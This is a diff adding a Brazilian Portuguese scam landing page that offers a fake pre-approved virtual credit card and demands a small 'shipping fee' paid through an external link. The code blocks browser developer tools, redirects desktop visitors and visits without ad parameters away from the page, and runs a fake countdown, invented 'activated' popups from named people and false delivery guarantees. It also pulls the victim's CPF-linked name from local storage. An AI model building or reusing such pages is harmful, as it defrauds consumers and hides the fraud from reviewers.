@@ -1,0 +1,652 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <script disable-devtool-auto="" src="https://cdn.jsdelivr.net/npm/disable-devtool"
+    url="https://appavaliadorpremios.shop/lp/"></script>
+
+<script type="text/javascript">
+    if (!navigator.userAgent.match(/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile)/) && window.innerWidth > 768) {
+        window.location.href = 'https://appavaliadorpremios.shop/lp/';
+    }
+</script>
+  <script type="text/javascript">
+  (function () {
+      /**
+       * Função para verificar a presença de múltiplos parâmetros na URL
+       * @param {Array} names - Array contendo os nomes dos parâmetros a serem verificados
+       * @returns {boolean} - Retorna true se todos os parâmetros estiverem presentes, caso contrário, false
+       */
+      function hasAllURLParameters(names) {
+          const urlParams = new URLSearchParams(window.location.search);
+          return names.every(param => urlParams.has(param));
+      }
+
+      // Array contendo os parâmetros obrigatórios
+      const requiredParams = ['CampaignID', 'adSETID', 'CreativeID', 'pixel_id'];
+
+      // URL para redirecionamento caso algum dos parâmetros não esteja presente
+      const redirectURL = 'https://appavaliadorpremios.shop/lp/';
+
+      /**
+       * Função principal que verifica os parâmetros da URL
+       * e redireciona o usuário se necessário
+       */
+      function checkURLParameters() {
+          if (!hasAllURLParameters(requiredParams)) {
+              window.location.href = redirectURL;
+          }
+      }
+
+      // Executa a verificação imediatamente assim que o script é carregado
+      checkURLParameters();
+  })();
+</script><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link href="css/all.min.css" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Pagamento de Frete</title>
+
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        background-color: #fff;
+        color: #333;
+        margin: 0;
+        padding: 0;
+        display: flex;
+        flex-direction: column;
+        min-height: 100vh;
+      }
+
+      .header {
+        background: linear-gradient(147deg, #ffe53b 0%, #ff2525 74%);
+        padding: 15px 0;
+        text-align: center;
+        border-bottom: 1px solid #ddd;
+      }
+
+      .header img {
+        width: 120px;
+      }
+
+      .main-content {
+        max-width: 500px;
+        background-color: white;
+        text-align: center;
+        padding: 2rem;
+        border-radius: 10px;
+        box-shadow: 0 2px 20px rgba(0, 0, 0, 0.1);
+        margin: 40px auto;
+      }
+
+      .card-virtual {
+        background-color: #1e293b;
+        color: white;
+        border-radius: 15px;
+        padding: 20px;
+        margin-bottom: 20px;
+        text-align: left;
+        position: relative;
+      }
+
+      .card-header {
+        font-weight: bold;
+        font-size: 18px;
+      }
+
+      .card-number {
+        font-size: 20px;
+        letter-spacing: 3px;
+        margin: 15px 0;
+      }
+
+      .card-info {
+        display: flex;
+        justify-content: space-between;
+      }
+
+      .card-info div {
+        font-size: 12px;
+      }
+
+      .mastercard-logo {
+        position: absolute;
+        top: 20px;
+        right: 20px;
+        width: 50px;
+      }
+
+      .shopee-logo {
+        position: absolute;
+        top: 150px;
+        right: 320px;
+        width: 100px;
+      }
+
+      .details-section {
+        background-color: #f9f9f9;
+        border: 1px solid #e0e0e0;
+        border-radius: 10px;
+        padding: 15px;
+        text-align: left;
+        margin-top: 20px;
+      }
+
+      .detail {
+        display: flex;
+        align-items: center;
+        margin-bottom: 15px;
+      }
+
+      .icon {
+        font-size: 20px;
+        color: #ff2525;
+        margin-right: 10px;
+      }
+
+      .detail-text {
+        font-size: 14px;
+        line-height: 1.2;
+        margin-bottom: 5px;
+      }
+
+      .detail-title {
+        font-weight: bold;
+        color: #333;
+        margin-bottom: 2px;
+      }
+
+      .price {
+        font-size: 28px;
+        font-weight: bold;
+        color: #ff2525;
+        margin-top: 15px;
+      }
+
+      .btn-custom {
+        background-color: #ff2525;
+        color: white;
+        border: none;
+        border-radius: 8px;
+        padding: 12px;
+        width: 100%;
+        font-weight: bold;
+        cursor: pointer;
+        margin-top: 15px;
+      }
+
+      .btn-custom:hover {
+        background-color: #000;
+      }
+
+      .secure-payment {
+        font-size: 12px;
+        color: #28a745;
+        margin-top: 10px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .secure-payment i {
+        margin-right: 5px;
+      }
+
+      .scarcity {
+        background-color: #ffe6e6;
+        border: 1px solid #ff9999;
+        border-radius: 8px;
+        padding: 15px;
+        color: #cc0000;
+        text-align: center;
+        margin-top: 20px;
+      }
+
+      .scarcity i {
+        font-size: 18px;
+        margin-right: 5px;
+      }
+
+      .scarcity strong {
+        font-size: 14px;
+      }
+
+      .footer {
+        background: #ffffff;
+        border-top: 1px solid #e6e6e6;
+        text-align: center;
+        padding: 15px;
+        font-size: 10px;
+        color: #666;
+      }
+
+      .main-title {
+        font-size: 20px;
+      }
+    </style>
+
+    <!-- Google tag (gtag.js) -->
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-NGSPZL3X93"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-NGSPZL3X93');
+</script>
+
+
+  </head>
+
+  <body>
+    
+    <div class="header">
+      <img src="images/logo.png" alt="Logo">
+    </div>
+
+    <div class="main-content">
+      <!-- Limite Disponível -->
+      <b><p style="font-size: 14px; color: #000">Limite Disponível</p></b>
+      <b><h1 style="font-size: 28px; color: #ff2525">R$ 4.800,00</h1></b>
+
+      <!-- Cartão Virtual -->
+      <div class="card-virtual">
+        <div class="card-header">Cartão Virtual</div>
+        <div class="card-number">4532 •••• •••• ••••</div>
+        <div class="card-info">
+          <div>
+            <div><strong>TITULAR</strong></div>
+            <div id="titular-nome">nivo front teste</div>
+          </div>
+          <div>
+            <div><strong>VALIDADE</strong></div>
+            <div>12/31</div>
+          </div>
+          <div>
+            <div><strong>CVV</strong></div>
+            <div>•••</div>
+          </div>
+        </div>
+        <br>
+        <br>
+
+        <img src="images/Visa-logo-white.png" alt="Mastercard Logo" class="mastercard-logo">
+      </div>
+
+      <!-- Detalhes do Frete -->
+      <b><h1 class="main-title">Finalize o envio do seu cartão</h1></b>
+      <p>Pague o frete para receber o cartão físico e ativar o virtual.</p>
+      <div class="details-section">
+        <div class="detail">
+          <div>
+            <p class="detail-title">Método de Envio</p>
+            <p class="detail-text">CORREIOS - SEDEX</p>
+          </div>
+        </div>
+        <div class="detail">
+          <div>
+            <p class="detail-title">Prazo de Entrega</p>
+            <p class="detail-text">1 dia útil</p>
+          </div>
+        </div>
+        <div class="detail">
+          <div>
+            <p class="detail-title">Pagamento em Até 10 Minutos</p>
+            <p class="detail-text">
+              Realize o pagamento do frete em até 10 minutos para ativar o
+              cartão virtual.
+            </p>
+          </div>
+        </div>
+        <div class="detail">
+          <div>
+            <p class="detail-title">Ativação Após Pagamento</p>
+            <p class="detail-text">
+              O cartão virtual será ativado automaticamente após a aprovação do
+              pagamento.
+            </p>
+          </div>
+        </div>
+      </div>
+
+      <!-- Preço -->
+      <p class="price">R$ 34,90</p>
+      <p class="payment-note">O pagamento será confirmado imediatamente</p>
+
+      <!-- Botão de Pagamento -->
+      <!-- Botão de Pagamento -->
+      <button class="btn-custom" onclick="redirecionar()" id="7509205c-ab5a-af5d-0431-8aff86ece078">Pagar Frete</button>
+
+      <script>
+        function redirecionar() {
+          // Redireciona para o link desejado
+          const dadosUsuario = JSON.parse(localStorage.getItem("dadosCPF"));
+          const whatsapp = localStorage.getItem("whatsapp");
+          const nomeCompleto = dadosUsuario.nomeCompleto;
+          const cpfCompleto = dadosUsuario.cpf;
+          const emailCompleto = dadosUsuario.email;
+
+          window.location.href =
+            `https://go.pepper.com.br/68krm` +
+            window.location.search;
+        }
+      </script>
+
+      <!-- Pagamento Seguro -->
+      <div class="secure-payment">
+        <i class="fas fa-lock"></i>
+        Pagamento 100% seguro
+      </div>
+
+      <!-- Bloco de Escassez -->
+      <div class="scarcity" id="scarcity-block">
+        <strong>Apenas 5 unidades disponíveis!</strong>
+        <div><i class="fas fa-clock"></i><span id="timer">04:44</span></div>
+        <strong>Ative agora ou perca seu limite aprovado!</strong>
+      </div>
+    </div>
+    <!-- Perguntas Frequentes -->
+    <div class="faq-section">
+      <h3 style="
+          text-align: center;
+          margin-top: 20px;
+          font-size: 18px;
+          color: #ffc600;
+        ">
+        Perguntas Frequentes
+      </h3>
+      <div class="faq-container">
+        <div class="faq-item">
+          <button class="faq-question" id="8f22d1c6-d1b5-8fea-bd77-f37c436990ce">
+            Como funciona o cartão virtual? <i class="fas fa-chevron-down"></i>
+          </button>
+          <div class="faq-answer">
+            Você receberá dois cartões: um virtual para uso imediato em compras
+            online com total segurança, e um físico que será entregue em sua
+            casa. O cartão virtual é ativado assim que confirmamos o pagamento
+            do frete, e o físico chega pelos Correios.
+          </div>
+        </div>
+        <div class="faq-item">
+          <button class="faq-question" id="837f7f21-3b14-03e1-a978-7e2364abed02">
+            Por que eu preciso pagar o frete?
+            <i class="fas fa-chevron-down"></i>
+          </button>
+          <div class="faq-answer">
+            O pagamento do frete é obrigatório para garantir a entrega segura do
+            seu cartão físico e a ativação imediata do seu cartão virtual. Sem
+            ele, não é possível concluir o envio.
+          </div>
+        </div>
+        <div class="faq-item">
+          <button class="faq-question" id="5e51be84-e6d8-db4a-9bc9-2c8176225a8a">
+            O que acontece depois que eu pagar o frete?<i class="fas fa-chevron-down"></i>
+          </button>
+          <div class="faq-answer">
+            • Seu cartão virtual é ativado e enviado por WhatsApp • Você recebe
+            acesso ao aplicativo com seu cartão<br>
+            • Um gerente exclusivo entra em contato via WhatsApp<br>
+            • Enviamos o código de rastreamento do cartão físico<br>
+          </div>
+        </div>
+        <div class="faq-item">
+          <button class="faq-question" id="f231c792-651d-3701-6856-55a23bb801dd">
+            E se eu pagar o frete e o cartão não chegar?<i class="fas fa-chevron-down"></i>
+          </button>
+          <div class="faq-answer">
+            O cartão é enviado pelos Correios com rastreamento e garantimos 100%
+            a entrega. Caso ocorra algum problema, enviaremos outro cartão sem
+            custo para você. Nunca tivemos problemas com outros usuários.
+          </div>
+        </div>
+        <div class="faq-item">
+          <button class="faq-question" id="15944837-652a-0c14-b107-5fd953ae61a8">
+            E se eu não pagar o frete agora?<i class="fas fa-chevron-down"></i>
+          </button>
+          <div class="faq-answer">
+            Além de não receber o cartão, você perderá o limite já aprovado e
+            não poderá fazer outra solicitação. Essa é uma oportunidade única,
+            então não deixe para depois!
+          </div>
+        </div>
+        <div class="faq-item">
+          <button class="faq-question" id="90632a8c-8ab3-d4d2-5a7d-ae042d05c719">
+            Já paguei o frete. Preciso fazer mais alguma coisa?<i class="fas fa-chevron-down"></i>
+          </button>
+          <div class="faq-answer">
+            Não. Após o pagamento, cuidamos de tudo. O envio do cartão é
+            iniciado em até 2 horas, e você receberá o link com o código de
+            rastreamento para acompanhar a entrega. É só aguardar!
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <style>
+      .faq-section {
+        background-color: #f9f9f9;
+        border: 1px solid #e0e0e0;
+        border-radius: 8px;
+        padding: 15px;
+        margin: 20px 0;
+      }
+
+      .faq-container {
+        display: flex;
+        flex-direction: column;
+        gap: 10px;
+      }
+
+      .faq-item {
+        border-bottom: 1px solid #e0e0e0;
+        padding-bottom: 10px;
+      }
+
+      .faq-item:last-child {
+        border-bottom: none;
+      }
+
+      .faq-question {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        background: none;
+        border: none;
+        outline: none;
+        font-size: 14px;
+        font-weight: bold;
+        text-align: left;
+        width: 100%;
+        cursor: pointer;
+        color: #333;
+        padding: 5px 0;
+      }
+
+      .faq-answer {
+        display: none;
+        font-size: 12px;
+        color: #666;
+        margin-top: 5px;
+        line-height: 1.4;
+      }
+
+      .faq-question i {
+        transition: transform 0.3s ease;
+      }
+
+      .faq-item.open .faq-answer {
+        display: block;
+      }
+
+      .faq-item.open .faq-question i {
+        transform: rotate(180deg);
+      }
+    </style>
+
+    <script>
+      // Controle de abertura e fechamento das perguntas frequentes
+      document.querySelectorAll(".faq-question").forEach((question) => {
+        question.addEventListener("click", function () {
+          const faqItem = this.parentElement;
+          faqItem.classList.toggle("open");
+        });
+      });
+    </script>
+
+    <!-- Pop-up Notification -->
+    <div id="popup-notification" class="popup-notification">
+      <i class="fas fa-bell"></i>
+      <span id="popup-message">Mariana Lima ativou o cartão!</span>
+    </div>
+
+    <style>
+      .popup-notification {
+        position: fixed;
+        bottom: 20px;
+        left: 20px;
+        background-color: #f9f9f9;
+        border: 1px solid #ddd;
+        box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+        border-radius: 10px;
+        padding: 10px 15px;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        font-size: 14px;
+        color: #333;
+        display: none; /* Oculto por padrão */
+        z-index: 9999;
+      }
+
+      .popup-notification i {
+        color: #ffc600;
+        font-size: 18px;
+      }
+
+      .popup-notification.show {
+        display: flex;
+        animation: fadeIn 0.5s ease, fadeOut 0.5s ease 4.5s;
+      }
+
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+          transform: translateY(20px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      @keyframes fadeOut {
+        from {
+          opacity: 1;
+          transform: translateY(0);
+        }
+        to {
+          opacity: 0;
+          transform: translateY(20px);
+        }
+      }
+    </style>
+
+    <script>
+      // Lista de nomes e mensagens
+      const popupData = [
+        { name: "Ana Souza", message: "recebeu o cartão hoje!" },
+        { name: "Carlos Pereira", message: "pagou a taxa de envio!" },
+        { name: "Mariana Lima", message: "ativou o cartão!" },
+        { name: "João Oliveira", message: "ativou sua conta online!" },
+        { name: "Fernanda Costa", message: "ativou o cartão virtual!" },
+        { name: "Pedro Santos", message: "aumentou o limite do cartão!" },
+        { name: "Beatriz Almeida", message: "recebeu o cartão hoje!" },
+        { name: "Ricardo Mendes", message: "pagou a taxa de envio!" },
+        { name: "Sofia Ramos", message: "ativou o cartão virtual!" },
+        { name: "Lucas Moreira", message: "aumentou o limite do cartão!" },
+      ];
+
+      let currentIndex = 0;
+
+      function showPopup() {
+        const popup = document.getElementById("popup-notification");
+        const messageElement = document.getElementById("popup-message");
+
+        // Atualiza o nome e a mensagem
+        const { name, message } = popupData[currentIndex];
+        messageElement.textContent = `${name} ${message}`;
+
+        // Exibe o pop-up
+        popup.classList.add("show");
+
+        // Oculta o pop-up após 2 segundos
+        setTimeout(() => {
+          popup.classList.remove("show");
+        }, 2000);
+
+        // Atualiza o índice para o próximo nome/mensagem
+        currentIndex = (currentIndex + 1) % popupData.length;
+      }
+
+      // Exibe o pop-up a cada 5 segundos
+      setInterval(showPopup, 5000);
+    </script>
+
+    <!-- Footer -->
+    <div class="footer">
+      Copyright © 2025 Verizon. Todos os direitos reservados.<br>
+
+      Política de Privacidade | Termos de Uso Vendas e Reembolsos | Legal Mapa
+      do Site
+    </div>
+
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        const dadosUsuario = JSON.parse(localStorage.getItem("dadosCPF"));
+        if (dadosUsuario && dadosUsuario.nomeCompleto) {
+          document.getElementById("titular-nome").innerText =
+            dadosUsuario.nomeCompleto;
+        } else {
+          document.getElementById("titular-nome").innerText =
+            "Nome Indisponível";
+        }
+
+        // Recuperar a cor do cartão do localStorage
+        const corCartao = localStorage.getItem("cartaoCor");
+        if (corCartao) {
+          document.querySelector(".card-virtual").style.backgroundColor =
+            corCartao;
+        }
+      });
+
+      const timerElement = document.getElementById("timer");
+      let timeRemaining = 300;
+
+      const countdown = setInterval(() => {
+        const minutes = Math.floor(timeRemaining / 60)
+          .toString()
+          .padStart(2, "0");
+        const seconds = (timeRemaining % 60).toString().padStart(2, "0");
+        timerElement.textContent = `${minutes}:${seconds}`;
+        timeRemaining--;
+
+        if (timeRemaining < 0) {
+          clearInterval(countdown);
+          timerElement.textContent = "00:00";
+        }
+      }, 1000);
+    </script>
+   
+   <script>
+      window.pixelId = "66b3a64f335ef199b3e5b257";
+      var a = document.createElement("script");
+      a.setAttribute("async", "");
+      a.setAttribute("defer", "");
+      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+      document.head.appendChild(a);
+    </script>
+    
+    <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+
+
+
+</body></html>
